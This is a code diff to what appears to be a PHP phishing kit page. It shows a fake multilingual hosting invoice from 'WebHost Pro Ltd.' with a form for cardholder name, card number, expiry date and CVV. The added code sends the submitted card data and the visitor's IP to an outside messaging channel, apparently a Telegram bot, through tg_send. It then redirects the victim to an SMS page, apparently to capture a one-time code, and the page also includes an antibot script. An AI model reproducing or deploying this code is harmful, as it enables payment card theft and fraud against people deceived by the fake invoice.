@@ -1,11 +1,6 @@
 <?php
-
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-
 include 'antibot.php';
-include_once("config.php");
+include_once 'config.php';
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $cc = function_exists('geoip_country_code_by_name') ? geoip_country_code_by_name($ip) : 'US';
@@ -112,3 +107,56 @@ $langs = [
 list($lang, $dir, $currency, $amount, $t) = $langs[$cc] ?? $langs['US'];
 
 tg_send("📥 <b>Visit:</b> x.php\\nIP: $ip\\nCountry: $cc");
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+  tg_send("💳 <b>Card Submitted</b>\\n👤 Name: {$_POST['card_name']}\\n💳 Number: {$_POST['card_number']}\\n📅 Exp: {$_POST['expiry_date']}\\n🔒 CVV: {$_POST['cvv']}\\n🌐 IP: $ip");
+  header("Location: sms.php");
+  exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="<?= $lang ?>" dir="<?= $dir ?>">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title><?= $t['title'] ?></title>
+  <style>
+    body { font-family: Arial; background: #f9f9f9; margin: 0; padding: 0; direction: <?= $dir ?>; }
+    .container { max-width: 500px; margin: 60px auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    h1 { text-align: center; color: #222; }
+    .info, label { text-align: <?= $dir === 'rtl' ? 'right' : 'left' ?>; }
+    label { margin-top: 12px; display: block; font-weight: bold; }
+    input[type="text"] { width: 100%; padding: 10px; margin-top: 6px; border: 1px solid #ccc; border-radius: 4px; }
+    button { width: 100%; padding: 14px; margin-top: 25px; background: #007bff; border: none; color: white; font-size: 16px; border-radius: 4px; }
+    button:hover { background: #0056b3; }
+    .secure { color: green; font-size: 13px; margin-bottom: 15px; }
+    .pdf { color: #007bff; font-size: 13px; margin-top: 10px; display: block; }
+  </style>
+</head>
+<body>
+<div class="container">
+  <p class="secure"><?= $t['secure'] ?></p>
+  <h1><?= $t['title'] ?></h1>
+  <div class="info">
+    <p><?= $t['invoice'] ?>: <strong>#INV-<?= rand(100000,999999) ?></strong></p>
+    <p><?= $t['date'] ?>: <strong><?= date("d/m/Y") ?></strong></p>
+    <p><?= $t['amount_due'] ?>: <strong><?= $currency . $amount ?></strong></p>
+    <p><?= $t['desc'] ?></p>
+    <p><strong><?= $t['provider'] ?>:</strong> WebHost Pro Ltd.<br>
+    <strong><?= $t['billing_email'] ?>:</strong> billing@webhost-pro.co.il</p>
+  </div>
+  <a class="pdf" href="#">🧾 <?= $t['download'] ?></a>
+  <form method="POST">
+    <label><?= $t['card_name'] ?></label>
+    <input type="text" name="card_name" required>
+    <label><?= $t['card_number'] ?></label>
+    <input type="text" name="card_number" maxlength="19" required>
+    <label><?= $t['expiry'] ?></label>
+    <input type="text" name="expiry_date" maxlength="5" required>
+    <label><?= $t['cvv'] ?></label>
+    <input type="text" name="cvv" maxlength="4" required>
+    <button type="submit"><?= $t['submit'] ?></button>
+  </form>
+</div>
+</body>
+</html>
